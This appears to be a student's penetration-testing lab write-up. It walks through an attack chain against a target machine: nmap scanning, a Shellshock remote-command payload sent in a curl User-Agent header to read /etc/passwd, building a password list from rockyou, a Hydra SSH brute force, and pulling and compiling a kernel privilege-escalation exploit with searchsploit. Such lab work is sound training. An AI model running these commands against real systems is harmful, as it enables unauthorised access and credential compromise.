# Activity 4.1

## Overview 🌍

* **Port scanning and version detection**
* **Nmap to CSV**
* **Remote code exection**
* **Password list & brute force**
* **File transfer**
* **Compiling exploit & privilege escalation**


## Port Scanning with nmap
Nmap port scans can show open ports and services running on those ports. The following command will scan the target for the top 100 common ports:
```bash
nmap -F <target> 
```
> The -F flag stands for fast mode and will scan fewer ports than the default scan (1000 ports)

Once open ports are found, further scans can reveal information about the services being run on the ports.
```bash
nmap -p <ports> -sV <target>
```
> The -p flag is used to scan specific ports gatherd from previous scan. -sV flag will probe open ports to determine service/version info.

Further information can be found at the [nmap man page.](https://linux.die.net/man/1/nmap)

## Nmap to CSV

Sometimes an nmap scan can reveal a lot of information and it can be hard to read in the terminal. Furthermore, sometimes it might be helpful to save this information and organize it for a later report. A tool called `nmaptocsv` allows the nmap results to be exported in csv foramt.

* **Install nmaptocsv**

```bash 
pip install nmaptocsv
```
> Sometimes a flag must to used to allow breaking of system packages

* **Using the tool**

Once the tool is installed it can be run against a file with nmap output results. 
```bash
nmaptocsv -i <nmapoutputfile> -d ","
```
> Copy the results of this command and paste into a spreadsheet. 

## Remote Code Exection

In this case, the system is running an apache web server and is vulnerable to shellshock. Here is string used to pass commands to the system.
```bash
sudo nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/status,cmd="echo ; echo ; /usr/bin/whoami" <target_ip>
```
> Version detection is run on port 80, and the shellshock detection script is run. The path /cgi-bin/status is used to execute the following whoami command confirming command exection. 

Another way to exploit the shellshock vulnerability is to manually set the headers to pass commands to be executed. The following command does this by settings the user agent to an emty bash function.  
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/<command>' bash -s :'' http://<target_ip>/cgi-bin/status
```
> This exploit can be used to display the contents of `/etc/passwd` giving further information on how we can access the target

## Password list & brute force

Once the usernames gathered from the command execution, they can be used to make a password file. In this example, I found the username samwise in /etc/passwd and will be filtering out passwords that contain the username into a password list file:

```bash
cat /usr/share/wordlists/rockyou.txt | grep -f samwise > ~/passlist.txt
```
> This command will give a list of passwords that contain the desired username. 

### Using Hydra to brute force the system

Now that we have a password list & a valid username, we can use it against the target with hydra:
```bash
sudo hydra -l <username> -p <passlist> <target_ip> -t 4 ssh
```
> This will test ssh passwords in the list against the username, and return the correct password. 

## Finding exploits with searchsploit

Now that user level access is achieved, the next step is root compromise. Exploits can be found using `searchsploit` against the kernal verson of the target. For example:
```bash
searchsploit Linux 2.6 
```
Once an exploit is located it can be pulled to the currect dir with the following
```bash
searchsploit -m <exploit_number>
```
Now an exploit is selected and on the machine, it must be copied over to the target. This can be done with python to create a web server at the current directory:
```bash
python3 -m http.server <port>
```
> Make sure to close the server after the file is transfered

### Compile and run the exploit

To compile the exploit pass the following:
```bash
gcc <exploit.c> -o <program_output>
```
> This command will compile the exploit and output it to an executable that can be run with `./<program>`



